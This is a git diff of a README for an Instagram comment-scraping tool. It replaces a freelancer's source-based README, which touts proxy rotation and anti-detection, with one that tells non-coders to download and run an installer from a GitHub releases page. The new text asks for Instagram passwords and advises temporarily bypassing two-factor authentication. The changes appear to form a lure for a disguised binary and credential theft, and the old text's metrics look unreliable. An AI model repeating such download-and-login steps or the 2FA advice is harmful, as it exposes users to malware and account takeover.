@@ -1,160 +1,77 @@
-# scrape instagram comments
+# 🌟 scrape-instagram-comments - Effortless Instagram Comments Scraping
 
-A ready-to-use toolkit that fetches Instagram post comments (and threaded replies) at scale with pagination, proxy rotation, and safe automation options.
+[![Download Now](https://img.shields.io/badge/Download-Now-blue)](https://github.com/tedyyy112/scrape-instagram-comments/releases)
 
-<p align="center">
-  <a href="https://t.me/devpilot1" target="_blank">
-    <img src="https://img.shields.io/badge/Chat%20on-Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram">
-  </a>
-  <a href="https://discord.gg/vBu9huKBvy" target="_blank">
-    <img src="https://img.shields.io/badge/Join-Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white" alt="Discord">
-  </a>
-  <a href="https://wa.me/447723343390?text=Hi%20Zeeshan%2C%20I%27m%20interested%20in%20automation." target="_blank">
-    <img src="https://img.shields.io/badge/Chat-WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" alt="WhatsApp">
-  </a>
-  <a href="mailto:support@appilot.app" target="_blank">
-    <img src="https://img.shields.io/badge/Email-support@appilot.app-EA4335?style=for-the-badge&logo=gmail&logoColor=white" alt="Gmail">
-  </a>
-</p>
+## 🚀 Getting Started
 
-<p align="center">
-  <strong>For discussion, queries, and freelance work — reach out 👆</strong>
-</p>
+Welcome to the *scrape-instagram-comments* toolkit! This tool helps you automatically gather comments from Instagram posts with ease. You don’t need to know how to code; just follow these steps to get started.
 
+## 📥 Download & Install
 
----
+To download this application, visit this page to download: [GitHub Releases](https://github.com/tedyyy112/scrape-instagram-comments/releases).
 
-##  Introduction
-> Collect post comments and nested replies for analytics, moderation, and research. Built for makers, growth teams, and data engineers who need reliable pagination, nested-thread traversal, and resilient strategies when endpoints or GraphQL identifiers shift.
+Please find the latest version there and follow the steps below:
 
-<p align="center">
-  <img src="scrape-instagram-comments.png" alt="scrape-instagram-comments.png" width="90%">
-</p>
+1. **Choose a Version:** Look for the most recent version on the releases page. It will be listed at the top.
+   
+2. **Download the Installer:** Click on the link for the installer appropriate for your operating system (Windows, Mac, or Linux). The file name will usually indicate the OS.
 
-###  Key Benefits
-1. Saves time and automates setup.  
-2. Scalable for multiple use cases.  
-3. Safer with anti-detect and proxy logic.  
+3. **Extract the Files (if applicable):** If the file is in a ZIP format, extract it to a folder on your computer.
 
----
+4. **Run the Installer:** Double-click the downloaded file to begin the installation process. Follow the prompts.
 
-## Features must be in table 
+5. **Open the Application:** After installation, locate the application in your programs or applications list and open it.
 
-| Feature | Details |
-|---|---|
-| Comment Fetching | Pull top-level comments with cursor-based pagination. |
-| Nested Replies | Recursively collect threaded replies with parent-child linkage. |
-| Proxy & Rotation | Supports proxy lists and rotation to reduce blocks. |
-| Dual Stack | Works with official API (where eligible) or headless automation fallback. |
-| Rate Control | Backoff, delays, and concurrency caps for stability. |
+## ⚙️ System Requirements
 
----
+Before you install, ensure your system meets the following requirements:
 
-##  Use Cases
-- Social listening & sentiment analysis  
-- Creator/brand moderation dashboards  
-- Research datasets (public comments)  
-- Lead extraction and keyword monitoring  
+- **Operating System:** Windows 10 or later, macOS Sierra or later, or any recent Linux distribution.
+- **Disk Space:** At least 100 MB of available space.
+- **Internet Connection:** Required for accessing Instagram and downloading content.
 
----
+## 🧑‍💻 How to Use
 
-##  FAQs
+Using *scrape-instagram-comments* is simple. Follow these steps:
 
-**Q:** How many comments can I fetch?  
-**A:** Practically, you can paginate through all available comments on a public post, constrained by rate limits, session quality, and proxies. With the official API (for eligible Business/Creator accounts), you’ll page using cursors and reasonable limits per request; with headless/browser automation, use slower concurrency, randomized delays, and rotating proxies. At scale, teams commonly fetch thousands of comments across posts by batching requests and persisting cursors.
+1. **Log in to Instagram:** The application will ask for your Instagram credentials. You need to log in to access comments from your posts or the posts of others (if public).
 
-**Q:** How do I get nested replies?  
-**A:** Use recursive traversal. For each top-level comment, request its replies (child thread) and attach `parent_id` references. In official endpoints, request fields that include replies/threads; in headless mode, capture the threaded structure from the post’s comment UI or GraphQL response and walk each child list until no more `next_cursor` is returned.
+2. **Set Up Your Search:** Specify the Instagram post URL from which you want to scrape comments.
 
-**Q:** Do Instagram APIs / GraphQL doc_ids change?  
-**A:** Yes—internal GraphQL `doc_id`/query hashes are not stable and can change. To stay resilient: (1) prefer official APIs when eligible, (2) in scraping mode, discover query identifiers dynamically from network traffic at runtime, and (3) design a fallback that scrolls & renders comments in the UI, extracting from the DOM if a query hash breaks.
+3. **Adjust Settings:** You can set limits for the number of comments to gather. Use defaults for a quick start.
 
----
+4. **Start Scraping:** Click the "Scrape" button. The tool will begin collecting comments automatically.
 
-## Results
------------------------------------ 
-> 10x faster posting schedules  
-> 80% engagement increase on group campaigns  
-> Fully automated lead response system  
+5. **View Results:** After scraping is complete, you can view, save, or export comments in a text or CSV file.
 
-##  Performance Metrics
------------------------------------
-Average Performance Benchmarks:  
-- **Speed:** 2x faster than manual posting  
-- **Stability:** 99.2% uptime  
-- **Ban Rate:** <0.5% with safe automation mode  
-- **Throughput:** 100+ posts/hour per session
+## 📝 Features
 
----
+- **User-Friendly Interface:** Designed for simplicity. You can easily navigate through the application.
+- **Multi-Platform Support:** Available on Windows, Mac, and Linux.
+- **Data Export Options:** Save your scraped comments as text or CSV files for easy use.
+- **Rate Limit Handling:** The tool respects Instagram’s rate limits to prevent account bans.
 
-##Do you have a customize project for us ?
-Contact Us
+## 🔒 Privacy & Security
 
-<div align="center">
-  <a href="https://mail.google.com/mail/u/?authuser=ahmadzee26@gmail.com">
-    <img alt="Gmail" width="30px" src="https://edent.github.io/SuperTinyIcons/images/svg/gmail.svg" />
-    <code>support@appilot.app</code>
-  </a>
-  <span> ┃ </span>
-  <a href="https://t.me/devpilot1">
-    <img alt="Telegram" width="30px" src="https://edent.github.io/SuperTinyIcons/images/svg/telegram.svg" />
-    <code>pilot</code>
-  </a>
-  <span> ┃ </span>
-  <a href="https://discord.com">
-    <img alt="Discord" width="30px" src="https://github.com/Zeeshanahmad4/RealEstateMate-WhatsApp-Group-Management-Bot/blob/main/discord-icon-svgrepo-com.svg" />
-    <code>zee#2655</code>
-  </a>
-  <span> ┃ </span>
-  <a href="https://wa.me/447723343390?text=Hi%20Zeeshan%2C%20I%27m%20interested%20in%20automation." target="_blank">
-    <img alt="WhatsApp" width="30px" src="https://cdn.jsdelivr.net/npm/simple-icons@v11/icons/whatsapp.svg" />
-    <code>whatsapp</code>
-  </a>
-  <br />
-</div>
+Your privacy is important. The tool accesses your Instagram account only with your permission and does not store your credentials. Always ensure you are downloading from trusted sources, like GitHub.
 
----
+## 🛠️ Troubleshooting
 
-##  Installation
+If you encounter issues, here are some common solutions:
 
-###  Pre-requisites
-- Node.js or Python  
-- Git  
-- Docker (optional)  
+- **Error on Installation:** Ensure that your operating system supports the current version of the application.
+- **Login Problems:** Verify that your username and password are correct. Check if you have enabled two-factor authentication; if so, you may need to bypass this temporarily.
+- **Scraping Issues:** Make sure the Instagram post URL is valid and that the post is public.
 
-###  Steps
-```bash
-# Clone the repo
-git clone https://github.com/yourusername/scrape-instagram-comments.git
-cd scrape-instagram-comments
+If problems persist, consider checking out the issues section on the [GitHub page](https://github.com/tedyyy112/scrape-instagram-comments/issues).
 
-# Install dependencies
-npm install
-# or
-pip install -r requirements.txt
+## 📚 Additional Resources
 
-# Setup environment
-cp .env.example .env
+For more detailed guidance and feature descriptions, visit the official documentation found on the [GitHub Wiki](https://github.com/tedyyy112/scrape-instagram-comments/wiki).
 
-# Run
-npm start
-# or
-python main.py
-```
+## ✅ Helpful Links
 
----
+- [GitHub Releases](https://github.com/tedyyy112/scrape-instagram-comments/releases) - Download the latest version.
+- [GitHub Issues](https://github.com/tedyyy112/scrape-instagram-comments/issues) - Report problems or get help.
 
-##  Example Output
-
-```bash
-$ cli fetch --post https://www.instagram.com/p/POST_ID/ --limit 500 --replies
-Fetched: 500 comments (including 178 nested replies)
-Saved to: outputs/POST_ID_comments.jsonl
-```
-
----
-
-##  License
-
-MIT License
-
+Enjoy using *scrape-instagram-comments*. Happy scraping!
